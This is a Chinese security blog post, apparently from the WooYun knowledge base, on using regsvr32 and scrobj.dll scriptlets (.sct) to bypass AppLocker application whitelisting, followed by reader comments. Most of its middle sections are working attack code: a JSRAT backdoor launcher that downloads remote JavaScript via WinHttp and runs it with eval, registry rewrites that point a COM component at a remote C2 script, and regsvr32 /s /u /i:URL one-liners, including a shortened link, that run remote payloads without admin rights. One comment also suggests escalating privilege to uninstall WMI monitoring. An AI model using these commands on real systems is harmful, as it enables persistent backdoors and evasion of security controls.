@@ -1,0 +1,203 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Use SCT to Bypass Application Whitelisting Protection</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/04/22 11:04" ui-time="" datetime="2016/04/22 11:04" class="published ng-binding ng-isolate-scope">2016/04/22 11:04</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>最近Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2f1cfcbd6cae2d1d7c0f6c7c7472a24461809461824461a22461a0847071f452c0b47261d453826442822471505">[email&#160;protected]</a>，利用sct文件来实现的持久机制。 我对此也很感兴趣,于是对相关的内容作了研究学习，在学习过程中Casey Smith又教会了我很多，学会了一个绕过应用程序白名单的技巧，所以在此将学到的知识整理一下。</p><p><img alt="enter image description here" img-src="725ad81565a71bf68d96e226bf8b27d001e51cb4.jpg"></p><p>链接如下：</p><p><a href="https://github.com/subTee/SCTPersistence">https://github.com/subTee/SCTPersistence</a></p><h1>0x01 简介</h1><hr><h3>Regsvr32</h3><p>Regsvr32命令用于注册动态链接库文件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。 <strong>语法：</strong></p><pre><code>regsvr32 [/u] [/s] [/n] [/i[:cmdline]] dllname 
+其中dllname为activex控件文件名
+</code></pre><p><strong>参数：</strong></p><pre><code>/u
+卸载已安装的控件或DLL文件
+/s
+静默，不显示任何消息框
+/n
+指定不调用 DllRegisterServer，此选项必须与 /i 共同使用
+/i:cmdline
+调用 DllInstall 将它传递到可选的 [cmdline]，在与 /u 共同使用时，它调用 dll 卸载
+dllname
+指定要注册的 dll 文件名
+</code></pre><h3>COM组件：</h3><p>以Win32动态链接库（DLL）或可执行文件（EXE）形式发布的可执行二进制代码，能够满足对组件架构的所有需求，可通过Regsvr32命令注册。</p><p><strong>特点：</strong></p><pre><code>组件与开发工具语言无关
+通过接口有效保证了组件的复用性
+组件运行效率高、便于使用和管理
+</code></pre><h3>Scriptlets：</h3><p>在可扩展标记语言（XML）文件中通过脚本语言（VBScript或者JScript）可以创建一个COM对象，后缀名为sct</p><h3>scrobj.dll：</h3><p>用来帮助将COM请求发送到脚本组件</p><h1>0x02 实例</h1><hr><h3>1、Component.sct</h3><p>内容如下：</p><pre><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+
+&lt;registration
+    description="Component"
+    progid="Component.InsideCOM"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-000000000001}"
+&gt;
+&lt;/registration&gt;
+
+&lt;public&gt;
+    &lt;method name="Sum"&gt;
+        &lt;PARAMETER name="X"/&gt;
+        &lt;PARAMETER name="Y"/&gt;
+    &lt;/method&gt;
+&lt;/public&gt;
+&lt;script language="VBScript"&gt;
+&lt;![CDATA[
+
+function Sum(X, Y)
+    Sum = X + Y
+end function
+
+]]&gt;
+&lt;/script&gt;
+
+&lt;/scriptlet&gt;
+</code></pre><h3>2、通过执行Regsvr32命令注册COM组件</h3><p>管理员权限执行：</p><pre><code>regsvr32 /i:"Component.sct" scrobj.dll
+</code></pre><p><img alt="enter image description here" img-src="e0a04cf44c4b3a04415925388bd5134dce9eb5d5.jpg"></p><p>如图，注册后在注册表<code>HKEY_CLASSES_ROOT\CLSID\</code>下同步创建键值<code>{10001111-0000-0000-0000-000000000001}</code></p><p><img alt="enter image description here" img-src="3c0cf1fa6d9fbbbd51660eeffbbd1c0b4f090abb.jpg"></p><p>注册表键值细节如下：</p><pre><code>[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}]
+@="Component"
+
+[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\VersionIndependentProgID]
+@="Component.InsideCOM"
+
+[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ProgID]
+@="Component.InsideCOM.1.00"
+
+[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ScriptletURL]
+@="file://C:\\WINDOWS\\Desktop\\Component.sct"
+
+[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\InprocServer32]
+@="C:\\WINDOWS\\SYSTEM\\SCROBJ.DLL"
+"ThreadingModel"="Apartment"
+</code></pre><h3>3、通过vbs调用注册过的COM组件</h3><p>TestVB.vbs:</p><pre><code>Dim ref 
+Set ref = CreateObject("Component.InsideCOM")
+MsgBox ref.Sum(4, 6)
+</code></pre><p>执行后如图，成功调用COM组件</p><p><img alt="enter image description here" img-src="67ea2b01bfadbb676e1315466dbfc6b9fed51232.jpg"></p><h3>4、补充</h3><p>以上通过VBS可调用刚刚注册的COM组件"Component.InsideCOM"，也可用JScript实现</p><p><strong>(1)JScript实现</strong></p><p>ComponentJS.sct： (<a href="https://github.com/subTee/SCTPersistence/blob/master/ComponentJS.sct">https://github.com/subTee/SCTPersistence/blob/master/ComponentJS.sct</a>)</p><pre><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+
+&lt;registration
+    description="Component"
+    progid="Component.InsideCOMJS"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-000000000002}"
+&gt;
+&lt;/registration&gt;
+
+&lt;public&gt;
+    &lt;method name="Sum"&gt;
+        &lt;PARAMETER name="X"/&gt;
+        &lt;PARAMETER name="Y"/&gt;
+    &lt;/method&gt;
+&lt;/public&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+
+function Sum(X, Y) {
+    var result = X + Y;
+    return result;
+    }
+]]&gt;
+&lt;/script&gt;
+
+&lt;/scriptlet&gt;
+</code></pre><p>TestJS.js: (<a href="https://github.com/subTee/SCTPersistence/blob/master/TestJS.js">https://github.com/subTee/SCTPersistence/blob/master/TestJS.js</a>)</p><pre><code>var ref = new ActiveXObject("Component.InsideCOMJS");
+var x = ref.Sum(4,6);
+WScript.Echo(x);
+</code></pre><p><strong>(2)可修改注册表键值以此更改COM组件内容</strong></p><p>COM组件的文件路径如下：</p><pre><code>[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ScriptletURL]
+@="file://C:\\WINDOWS\\Desktop\\Component.sct"
+</code></pre><p>如果修改为另一脚本的路径，那么再次调用组件会运行另一个脚本的内容</p><p><strong>(3)文件名可简化</strong></p><p>后缀名不一定必须用".sct"，其他格式也可以</p><p>如</p><pre><code>regsvr32 /i:"Component.txt" scrobj.dll
+</code></pre><p><strong>(4)/s参数</strong></p><p>加入/s参数可隐藏弹出的注册成功的对话框</p><p><strong>(5)sct文件可放在远程服务器上</strong> 如</p><pre><code>regsvr32 /s /i:http://192.168.1.1/Component.txt scrobj.dll
+</code></pre><p><strong>注：</strong></p><p>在代理环境下也能正常访问，也支持https访问</p><h1>0x03 应用1：JSRAT</h1><hr><h3>1、Casey的方法</h3><p><strong>(1)Backdoor.sct：</strong></p><p>(<a href="https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct">https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct</a>)</p><p>关键代码：</p><pre><code>function C2Config() {
+    //The default is to use the path to a local file... Here, I just rewrite the regkey, and now, the Class definition comes form the interwebs. Woo!
+    var WshShell = new ActiveXObject("WScript.Shell");
+    var strRegPath = "HKEY_CLASSES_ROOT\\CLSID\\{10001111-0000-0000-0000-00000000ACDC}\\ScriptletURL\\";
+    WshShell.RegWrite(strRegPath, "http://127.0.0.1:8080/c2.js", "REG_SZ");
+    }
+/*
+function Cleanup() { }
+//Clean your room!
+*/ 
+function Main() {
+    C2Config();
+    //Cleanup();    
+    }
+</code></pre><p>当运行Backdoor.sct注册COM组件时，Backdoor.sct会将组件注册表的键值ScriptletURL设为远程服务器上的地址：http://127.0.0.1:8080/c2.js</p><p>这样的好处是Backdoor.sct文件不需要保存在系统上面，同时只要修改服务器上的c2.js的内容就可以执行不同的命令</p><p><strong>(2)c2.js</strong></p><p>(<a href="https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/c2.js">https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/c2.js</a>) 此文件包含要执行的js命令</p><p><strong>(3)BackdoorTest.js</strong></p><p>(<a href="https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js">https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js</a>) 用于调用已注册的COM组件，内容如下：</p><pre><code>//调用Backdoor.sct中的C2Config()，将c2.js的路径写入注册表
+var x = new ActiveXObject("Component.Backdoor");
+x.Main();
+
+//调用c2.js中的代码执行功能
+var x = new ActiveXObject("Component.Backdoor");
+x.Exec();
+</code></pre><p><strong>注：</strong></p><p>调用方式不唯一，还可通过以下方式</p><p><strong>a.rundll32.exe</strong></p><pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Exec();
+</code></pre><p><strong>b.powershell</strong></p><pre><code>$s=New-Object -COM "Component.Backdoor";$s.Exec()
+</code></pre><h3>2、我的方法</h3><p><strong>(1)Backdoor.sct</strong></p><p>(<a href="https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct">https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct</a>) 直接在sct文件中写入JSRAT的启动代码</p><p>细节如下：</p><pre><code>function Exec()
+    {
+        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
+        new ActiveXObject("WScript.Shell").Run(rat,0,true);
+    }
+</code></pre><p><strong>(2)BackdoorTest.js</strong></p><p>(<a href="https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js">https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js</a>) 通过js脚本调用即可</p><p>当然也可以通过rundll32.exe调用，代码如下：</p><pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("JSRAT");x.Exec();
+</code></pre><p><strong>(3)注册组件的方式</strong></p><p>将Backdoor.sct放在远程服务器上，通过regsvr32注册</p><pre><code>regsvr32 /s /i:http://192.168.1.1/Backdoor.sct scrobj.dll
+</code></pre><p><strong>(4)调用COM组件"JSRAT"</strong></p><p>即可启动JSRAT</p><h1>0x04 应用2：绕过应用程序白名单过滤</h1><hr><p>标准的xml文件的内容如下：</p><pre><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+
+&lt;registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+    &gt;
+&lt;/registration&gt;
+
+&lt;public&gt;
+    &lt;method name="Exec"&gt;&lt;/method&gt;
+&lt;/public&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    }
+
+]]&gt;
+&lt;/script&gt;
+
+&lt;/scriptlet&gt;
+</code></pre><p>在成功注册COM组件后，通过调用exec()才能够执行里面的功能</p><p><strong>那么，如果把Exec()的功能直接加到<code>&lt;registration&gt;</code>的标签中呢？</strong> <strong>会不会在注册的过程中就可以调用exec()？</strong></p><p>以下是Casey的实现方式：</p><pre><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+
+&lt;registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+    &gt;
+    &lt;!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll --&gt;
+    &lt;!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll --&gt;
+    &lt;!-- That should work over a proxy and SSL/TLS... --&gt;
+    &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;
+    &lt;script language="JScript"&gt;
+        &lt;![CDATA[
+
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+
+&lt;public&gt;
+    &lt;method name="Exec"&gt;&lt;/method&gt;
+&lt;/public&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    }
+
+]]&gt;
+&lt;/script&gt;
+
+&lt;/scriptlet&gt;
+</code></pre><p>根据之前介绍的内容，现在来尝试注册这个COM组件：</p><pre><code>regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct
+</code></pre><p><img alt="enter image description here" img-src="31aa4559a6f9058535c329d08eef7f19052d078d.jpg"></p><p>如图虽然能够成功弹出计算器，但是会弹框提示报错</p><p>但是<strong>有趣的是</strong>我们可以通过/s参数来忽略这个错误：</p><pre><code>regsvr32 /s https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct
+</code></pre><p>这样就能够成功执行弹出计算器</p><p>而<strong>更有趣的是</strong>这个COM组件仍可以被正常调用：</p><p>js文件如下：</p><pre><code>var ref = new ActiveXObject("Empire");
+var c=ref.Exec();
+</code></pre><p>运行后会弹出cmd</p><p>总结以上的内容，只需执行如下代码即可执行远程服务器上的js脚本</p><pre><code>regsvr32 /s https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/bf04e98329ef471dcbbe621df5d61ddb4e802b63/Backdoor.sct
+</code></pre><p>或者</p><pre><code>regsvr32 /s https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct
+</code></pre><p>如果转换思路，就会发现这种方式可以绕过应用程序白名单的过滤</p><h1>0x05 进阶用法</h1><hr><p>介绍到这里，你也许会认为，通过注册COM组件来绕过应用程序白名单的过滤得需要管理员权限，这会是一个鸡肋。</p><p>但是，<strong>Casey</strong>发现了更高级的方法：</p><pre><code>不需要管理权限，同时也不需要写入注册表
+</code></pre><p>也许回头看这个技巧很简单，但是</p><p><strong>能想到大家想不到的，这就不简单</strong></p><p>既然可以通过注册控件来绕过白名单过滤，那么通过卸载应该也可以，而且<strong>卸载控件的操作不需要管理员权限，也不需要写入注册表</strong> 所以参数如下即可：</p><pre><code>regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
+</code></pre><p>如图，普通用户权限，开启Windows AppLocker，成功执行js代码，弹出计算器，前面介绍的JSRAT的应用方法也可以用这种方式执行</p><p><img alt="enter image description here" img-src="376c6ad1aa81fb72f5b8557188b2a6a2f4cdc925.jpg"></p><h1>0x06 补充</h1><hr><p>补充另一个sct的应用方法 前不久更新了JSRAT的内容，添加了自动识别代理进行通信的功能，因此JSRAT的启动代码变得更长：</p><pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+</code></pre><p>这样不仅对实际使用带来不便，同时也影响了在快捷方式下的应用：</p><p>快捷方式支持的最大字符长度为260，而JSRAT的启动代码远超260，详细问题描述可见：</p><p><a href="https://github.com/3gstudent/Javascript-Backdoor/issues/3">https://github.com/3gstudent/Javascript-Backdoor/issues/3</a></p><p>而通过sct来启动JSRAT恰恰可以解决这个问题，已将利用代码上传至github：</p><p><a href="https://github.com/3gstudent/SCTPersistence/blob/master/ShortJSRAT.sct">https://github.com/3gstudent/SCTPersistence/blob/master/ShortJSRAT.sct</a></p><p>通过regsvr32执行服务器上的ShortJSRAT.sct文件</p><p>ShortJSRAT.sct文件包含JSRAT的启动代码</p><p>最终优化的JSRAT启动代码如下：</p><pre><code>regsvr32 /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/ShortJSRAT.sct scrobj.dll
+</code></pre><p>如果觉得网址过长，可使用短地址来代替上述文件URL，短地址如下：</p><pre><code>regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll
+</code></pre><p><strong>注：</strong></p><p>该短地址是通过google url shortener生成，因此国内用户无法直接访问，换用其他平台的短地址服务就好。</p><h1>0x07 防御</h1><hr><p>综上，这个技巧的实现需要如下限制条件：</p><pre><code>能在系统上可以执行代码
+</code></pre><p>所以应用的前提是已经获得了系统的访问权限，因此只要保护好自身系统的安全就不会被这种类似的方式攻击。至于Windows AppLocker，无法防御sct的应用。</p><h1>0x08 小结</h1><hr><p>引用Casey博客的一句话:</p><p>(<a href="http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html">http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html</a>) <strong>Well, now that everyone has eyes on PowerShell...Lets see what we can do with JavaScript!</strong></p><p>再次感谢Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93c0fefae7fbd3e0e6f1c7f6f6763c2a751b02743307743a25772b19740917762b3d76193a">[email&#160;protected]</a>，十分感谢。有待研究的细节还有很多，如果你对此感兴趣，可以一起交流。</p><p>更多学习资料：</p><p>Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="aefdc3c7dac6eedddbccfacbcb4a15254915234b2607493a06fdedfa49153b4611294937134b3e234b233b47373e4b261849342a4b23344b000c4b321e4b332e">[email&#160;protected]</a>，值得学习： (<a href="http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html">http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html</a>)</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-04-27 14:53:26</span></div><p></p><p>@mickey 监控的话，说的是用wmi吧，如果真的要遇见了，想办法提权把wmi卸载了就好，所以没有100%的方法。JSRat有自己独特的优势，我会慢慢完善JSRAT的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2016-04-27 11:47:56</span></div><p></p><p>好文章。<br>通过regsvr32 /u不写注册表这个方法牛逼，神思路<br>监控的话，看老外说可以用&quot;Process Notifier&quot;来监控regsvr32进程，然后发邮件通知<br>另外JSRat真的好用吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blackwhite</span> <span class="reply-time">2016-04-26 10:56:25</span></div><p></p><p>不好意思，测试过程有疏忽，确实可以绕过</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blackwhite</span> <span class="reply-time">2016-04-26 10:46:21</span></div><p></p><p>虽然regsvr32 /u 可以不用管理员权限，但是最终执行脚本的wscript.exe还是得要管理员权限才能创建对象啊，楼主没测试过吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-04-22 17:31:59</span></div><p></p><p>@lcx 感谢，学习测试了直接调用的方法，目前认为直接调用的实际用途不是很大，还得深入研究一下。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lcx</span> <span class="reply-time">2016-04-22 16:12:10</span></div><p></p><p>@三好学生，它可以用regsvr32调用也可以直接调用<br>给你一点参考资料吧，我以前写过一个简单的东东：http://huaidan.org/archives/2574.html<br>可以搜索wsc后门及后续。<br>像有的主机上有cmdlib.wsc（我的win2012已经没有了），可以用它来获取主机名，代码<br>strComputer = &quot;.&quot;<br>Set objCmdLib = CreateObject(&quot;Microsoft.CmdLib&quot;)<br>Set objCmdLib.ScriptingHost = WScript.Application<br>Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)<br>WScript.Echo objCmdLib.getHostName(objWMIService)</p><p>更多资料看这个吧http://www.script-coding.com/SCI_WSC.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-04-22 14:36:04</span></div><p></p><p>@lcx 查了一下资料，http://www.cnblogs.com/windtail/archive/2012/11/26/2790090.html，wsc不需要注册是指？是不是还有别的使用方法，求介绍</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lcx</span> <span class="reply-time">2016-04-22 12:21:02</span></div><p></p><p>学习了。还有sct这个后缀，不过本质上与wsc文件没多大区别。wsc最大的好外是不需要注册、</p><p></p></div></div></div></div></div></main>
